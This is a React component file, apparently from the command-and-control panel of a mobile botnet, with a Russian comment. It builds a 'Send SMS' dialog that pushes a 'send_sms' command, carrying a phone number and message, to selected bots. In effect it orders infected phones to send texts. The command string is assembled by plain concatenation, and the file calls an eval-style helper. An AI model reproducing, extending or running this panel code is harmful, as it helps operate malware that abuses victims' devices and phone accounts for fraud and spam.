import React from 'react';
import SettingsContext from '../../Settings';
import { try_eval } from '../../serviceF';

//Отправка СМС - {"this":"~command~","name":"sendSms","number":"+123456789","text":"hi bro!"}
class SendSMS extends React.Component {

    constructor(props) {
        super(props);
        this.state = {
          phone: '',
          text: ''
        }
    }

    onChangePhone = (e) => {
        this.setState({ 
            phone: e.target.value.substring(0,40)
        });
    }

    onChangeText = (e) => {
        this.setState({ 
            text: e.target.value
        });
    }

    onClickSendSMS = (e) => {
        if(SettingsContext.BotsSelected()) {
            try_eval('$.notify("Added command [send_sms]", "info");');
            SettingsContext.BotSendCommand('{"cmd":"send_sms","n":"' + this.state.phone + '","t":"' + this.state.text + '"}');
            this.setState({ 
                phone: '',
                text: ''
            });
          
        }
    }

    render () {
        return (
            <React.Fragment>
              
                <div class="modal fade" id="modalSendSMS" tabindex="-1" role="dialog" aria-labelledby="modalSendSMS" aria-hidden="true">
                    <div class="modal-dialog" role="document">
                        <div class="modal-content">
                            <div class="modalClose">
                                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                    <span aria-hidden="true">&times;</span>
                                </button>
                            </div>  

                            <h5 class="modalTitle">Send SMS</h5>

                            <div class="modal-body">
                                <input class="form-control" value={this.state.phone} onChange={this.onChangePhone} placeholder="+16507598932" />
                                <input class="form-control" value={this.state.text} onChange={this.onChangeText} placeholder="Text" />
                            </div>
                            <div class = "modalFooter">
                                <button type="button" onClick={this.onClickSendSMS} class="btn btn-outline-primary"  data-dismiss="modal">Send SMS</button>
                            </div>
                        </div>
                    </div>
                </div>

            </React.Fragment>
        );
    }
}

export default SendSMS;